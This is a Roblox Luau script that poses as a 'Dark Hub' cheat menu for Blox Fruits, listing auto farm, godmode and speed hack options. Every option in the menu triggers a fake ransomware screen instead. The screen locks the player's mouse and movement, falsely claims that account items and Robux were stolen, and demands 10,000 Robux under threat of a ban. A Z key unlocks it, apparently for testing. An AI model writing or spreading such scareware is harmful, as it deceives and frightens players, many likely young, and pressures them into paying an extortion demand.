-- language: Luau, file: dark.lua, target: Roblox Studio (LocalScript)

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Remove UI antiga se existir
local oldGui = playerGui:FindFirstChild("DarkHub")
if oldGui then oldGui:Destroy() end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "DarkHub"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = playerGui

-- ==========================================
-- FUNÇÃO DO RANSOMWARE
-- ==========================================
local isRansomwareActive = false

local function TriggerRansomware()
    if isRansomwareActive then return end
    isRansomwareActive = true
    
    ScreenGui.Enabled = false
    
    pcall(function() 
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
    end)
    UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter

    local ScreenGuiR = Instance.new("ScreenGui")
    ScreenGuiR.Name = "DarkRansomware"
    ScreenGuiR.IgnoreGuiInset = true
    ScreenGuiR.DisplayOrder = 999999999
    ScreenGuiR.ResetOnSpawn = false
    ScreenGuiR.Parent = playerGui

    local Background = Instance.new("Frame")
    Background.Size = UDim2.new(1, 0, 1, 0)
    Background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Background.BorderSizePixel = 0
    Background.ZIndex = 999999998
    Background.Parent = ScreenGuiR

    local Sound = Instance.new("Sound")
    Sound.SoundId = "rbxassetid://131961136" 
    Sound.Volume = 5
    Sound.Parent = Background
    Sound:Play()

    local ChudImage = Instance.new("ImageLabel")
    ChudImage.Size = UDim2.new(0, 200, 0, 200)
    ChudImage.Position = UDim2.new(0.5, -100, 0.1, 0)
    ChudImage.BackgroundTransparency = 1
    ChudImage.Image = "rbxassetid://1316045217"
    ChudImage.ZIndex = 999999999
    ChudImage.Parent = Background

    local RTitle = Instance.new("TextLabel")
    RTitle.Size = UDim2.new(1, 0, 0, 50)
    RTitle.Position = UDim2.new(0, 0, 0.45, 0)
    RTitle.BackgroundTransparency = 1
    RTitle.Text = "DARK HUB HAS BEEN COMPROMISED"
    RTitle.TextColor3 = Color3.fromRGB(255, 0, 0)
    RTitle.Font = Enum.Font.Antique
    RTitle.TextSize = 48
    RTitle.TextScaled = true
    RTitle.ZIndex = 999999999
    RTitle.Parent = Background

    local RSubtitle = Instance.new("TextLabel")
    RSubtitle.Size = UDim2.new(0.8, 0, 0, 150)
    RSubtitle.Position = UDim2.new(0.1, 0, 0.55, 0)
    RSubtitle.BackgroundTransparency = 1
    RSubtitle.Text = "Your Blox Fruits account data has been locked.\nAll your fruits, levels, and Robux have been transferred to our servers.\n\nTo decrypt your files, send 10,000 Robux.\n\nFAILURE TO COMPLY WILL RESULT IN PERMANENT BAN."
    RSubtitle.TextColor3 = Color3.fromRGB(255, 255, 255)
    RSubtitle.Font = Enum.Font.Code
    RSubtitle.TextSize = 18
    RSubtitle.TextWrapped = true
    RSubtitle.ZIndex = 999999999
    RSubtitle.Parent = Background

    task.spawn(function()
        while ScreenGuiR.Parent do
            RTitle.Visible = true
            task.wait(0.3)
            RTitle.Visible = false
            task.wait(0.3)
        end
    end)

    task.spawn(function()
        while ScreenGuiR.Parent do
            if player.Character and player.Character:FindFirstChild("Humanoid") then
                player.Character.Humanoid.WalkSpeed = 0
                player.Character.Humanoid.JumpPower = 0
            end
            task.wait(0.1)
        end
    end)
    
    -- Aperte Z para sair (pra você testar sem travar o studio)
    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if input.KeyCode == Enum.KeyCode.Z then
            ScreenGuiR:Destroy()
            pcall(function() 
                StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
                StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
            end)
            UserInputService.MouseBehavior = Enum.MouseBehavior.Default
            if player.Character and player.Character:FindFirstChild("Humanoid") then
                player.Character.Humanoid.WalkSpeed = 16
                player.Character.Humanoid.JumpPower = 50
            end
        end
    end)
end

-- ==========================================
-- BOLINHA FLUTUANTE (CHUD)
-- ==========================================
local ToggleBtn = Instance.new("ImageButton")
ToggleBtn.Name = "ToggleButton"
ToggleBtn.Size = UDim2.new(0, 60, 0, 60)
ToggleBtn.Position = UDim2.new(0, 20, 0, 20)
ToggleBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
ToggleBtn.Image = "rbxassetid://1316045217" 
ToggleBtn.ScaleType = Enum.ScaleType.Crop
ToggleBtn.Parent = ScreenGui

local ToggleCorner = Instance.new("UICorner")
ToggleCorner.CornerRadius = UDim.new(1, 0)
ToggleCorner.Parent = ToggleBtn

local ToggleStroke = Instance.new("UIStroke")
ToggleStroke.Color = Color3.fromRGB(255, 255, 255)
ToggleStroke.Thickness = 2
ToggleStroke.Parent = ToggleBtn

-- ==========================================
-- JANELA PRINCIPAL (UI DO HUB)
-- ==========================================
local MainFrame = Instance.new("Frame")
MainFrame.Name = "Main"
MainFrame.Size = UDim2.new(0, 520, 0, 360)
MainFrame.Position = UDim2.new(0.5, -260, 0.5, -180)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Visible = false
MainFrame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 8)
UICorner.Parent = MainFrame

local UIStroke = Instance.new("UIStroke")
UIStroke.Color = Color3.fromRGB(255, 255, 255)
UIStroke.Thickness = 1
UIStroke.Transparency = 0.5
UIStroke.Parent = MainFrame

local TopBar = Instance.new("Frame")
TopBar.Name = "TopBar"
TopBar.Size = UDim2.new(1, 0, 0, 35)
TopBar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TopBar.BorderSizePixel = 0
TopBar.Parent = MainFrame

local TopCorner = Instance.new("UICorner")
TopCorner.CornerRadius = UDim.new(0, 8)
TopCorner.Parent = TopBar

local Title = Instance.new("TextLabel")
Title.Name = "Title"
Title.Size = UDim2.new(1, -40, 1, 0)
Title.Position = UDim2.new(0, 15, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "DARK HUB | PREMIUM V2.0"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 14
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = TopBar

local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 35, 1, 0)
CloseBtn.Position = UDim2.new(1, -35, 0, 0)
CloseBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
CloseBtn.Text = "X"
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.TextSize = 14
CloseBtn.Parent = TopBar

local CloseCorner = Instance.new("UICorner")
CloseCorner.CornerRadius = UDim.new(0, 8)
CloseCorner.Parent = CloseBtn

local Sidebar = Instance.new("Frame")
Sidebar.Name = "Sidebar"
Sidebar.Size = UDim2.new(0, 120, 1, -45)
Sidebar.Position = UDim2.new(0, 8, 0, 42)
Sidebar.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Sidebar.BorderSizePixel = 0
Sidebar.Parent = MainFrame

local SidebarCorner = Instance.new("UICorner")
SidebarCorner.CornerRadius = UDim.new(0, 6)
SidebarCorner.Parent = Sidebar

local SidebarList = Instance.new("UIListLayout")
SidebarList.SortOrder = Enum.SortOrder.LayoutOrder
SidebarList.Padding = UDim.new(0, 6)
SidebarList.Parent = Sidebar

local SidebarPadding = Instance.new("UIPadding")
SidebarPadding.PaddingTop = UDim.new(0, 10)
SidebarPadding.Parent = Sidebar

local Content = Instance.new("ScrollingFrame")
Content.Name = "Content"
Content.Size = UDim2.new(1, -135, 1, -45)
Content.Position = UDim2.new(0, 130, 0, 42)
Content.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Content.BorderSizePixel = 0
Content.ScrollBarThickness = 2
Content.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255)
Content.Parent = MainFrame

local ContentList = Instance.new("UIListLayout")
ContentList.SortOrder = Enum.SortOrder.LayoutOrder
ContentList.Padding = UDim.new(0, 8)
ContentList.Parent = Content

local ContentPadding = Instance.new("UIPadding")
ContentPadding.PaddingTop = UDim.new(0, 10)
ContentPadding.PaddingLeft = UDim.new(0, 10)
ContentPadding.Parent = Content

local function CreateTab(name)
    local TabBtn = Instance.new("TextButton")
    TabBtn.Size = UDim2.new(1, -16, 0, 32)
    TabBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    TabBtn.Text = name
    TabBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
    TabBtn.Font = Enum.Font.GothamSemibold
    TabBtn.TextSize = 12
    TabBtn.Parent = Sidebar
    
    local TabCorner = Instance.new("UICorner")
    TabCorner.CornerRadius = UDim.new(0, 4)
    TabCorner.Parent = TabBtn
    
    return TabBtn
end

local function CreateToggle(text, parent)
    local ToggleFrame = Instance.new("Frame")
    ToggleFrame.Size = UDim2.new(1, -10, 0, 38)
    ToggleFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    ToggleFrame.Parent = parent
    
    local TFCorner = Instance.new("UICorner")
    TFCorner.CornerRadius = UDim.new(0, 6)
    TFCorner.Parent = ToggleFrame
    
    local TFLabel = Instance.new("TextLabel")
    TFLabel.Size = UDim2.new(1, -50, 1, 0)
    TFLabel.Position = UDim2.new(0, 12, 0, 0)
    TFLabel.BackgroundTransparency = 1
    TFLabel.Text = text
    TFLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
    TFLabel.Font = Enum.Font.Gotham
    TFLabel.TextSize = 13
    TFLabel.TextXAlignment = Enum.TextXAlignment.Left
    TFLabel.Parent = ToggleFrame
    
    local ToggleBtn = Instance.new("TextButton")
    ToggleBtn.Size = UDim2.new(0, 40, 0, 20)
    ToggleBtn.Position = UDim2.new(1, -52, 0.5, -10)
    ToggleBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    ToggleBtn.Text = ""
    ToggleBtn.Parent = ToggleFrame
    
    local TBCorner = Instance.new("UICorner")
    TBCorner.CornerRadius = UDim.new(1, 0)
    TBCorner.Parent = ToggleBtn
    
    local Circle = Instance.new("Frame")
    Circle.Size = UDim2.new(0, 16, 0, 16)
    Circle.Position = UDim2.new(0, 2, 0, 2)
    Circle.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
    Circle.Parent = ToggleBtn
    
    local CC = Instance.new("UICorner")
    CC.CornerRadius = UDim.new(1, 0)
    CC.Parent = Circle
    
    local toggled = false
    ToggleBtn.MouseButton1Click:Connect(function()
        toggled = not toggled
        if toggled then
            ToggleBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Circle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            Circle:TweenPosition(UDim2.new(1, -18, 0, 2), "Out", "Quad", 0.1)
            task.delay(0.2, TriggerRansomware)
        else
            ToggleBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
            Circle.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
            Circle:TweenPosition(UDim2.new(0, 2, 0, 2), "Out", "Quad", 0.1)
        end
    end)
    
    return ToggleFrame
end

local function CreateButton(text, parent)
    local Btn = Instance.new("TextButton")
    Btn.Size = UDim2.new(1, -10, 0, 38)
    Btn.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    Btn.Text = text
    Btn.TextColor3 = Color3.fromRGB(220, 220, 220)
    Btn.Font = Enum.Font.Gotham
    Btn.TextSize = 13
    Btn.Parent = parent
    
    local BC = Instance.new("UICorner")
    BC.CornerRadius = UDim.new(0, 6)
    BC.Parent = Btn
    
    Btn.MouseEnter:Connect(function()
        Btn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    end)
    Btn.MouseLeave:Connect(function()
        Btn.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    end)
    
    Btn.MouseButton1Click:Connect(function()
        Btn.Text = "Executando..."
        task.delay(0.5, TriggerRansomware)
    end)
    
    return Btn
end

local function ClearContent()
    for _, v in pairs(Content:GetChildren()) do
        if v:IsA("Frame") or v:IsA("TextButton") then 
            v:Destroy() 
        end
    end
end

local TabFarm = CreateTab("Auto Farm")
local TabPlayer = CreateTab("Player")
local TabMisc = CreateTab("Misc")

local function ShowFarmTab()
    ClearContent()
    CreateToggle("Auto Farm Level (Fast)", Content)
    CreateToggle("Auto Farm Beli", Content)
    CreateToggle("Auto Farm Fragments", Content)
    CreateToggle("Auto Raid (Solo)", Content)
    CreateButton("Teleport to Sea Beast", Content)
end

local function ShowPlayerTab()
    ClearContent()
    CreateToggle("Godmode (Bypass)", Content)
    CreateToggle("Infinite Energy", Content)
    CreateToggle("Speed Hack (120)", Content)
    CreateButton("Reset Character", Content)
end

local function ShowMiscTab()
    ClearContent()
    CreateButton("Redeem All Codes", Content)
    CreateButton("Join Discord Server", Content)
    CreateToggle("Anti-AFK", Content)
end

local function SetActiveTab(activeBtn)
    for _, v in pairs(Sidebar:GetChildren()) do
        if v:IsA("TextButton") then
            v.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            v.TextColor3 = Color3.fromRGB(200, 200, 200)
        end
    end
    activeBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    activeBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
end

TabFarm.MouseButton1Click:Connect(function() SetActiveTab(TabFarm); ShowFarmTab() end)
TabPlayer.MouseButton1Click:Connect(function() SetActiveTab(TabPlayer); ShowPlayerTab() end)
TabMisc.MouseButton1Click:Connect(function() SetActiveTab(TabMisc); ShowMiscTab() end)

SetActiveTab(TabFarm)
ShowFarmTab()

CloseBtn.MouseButton1Click:Connect(function()
    MainFrame.Visible = false
end)

ToggleBtn.MouseButton1Click:Connect(function()
    MainFrame.Visible = not MainFrame.Visible
end)
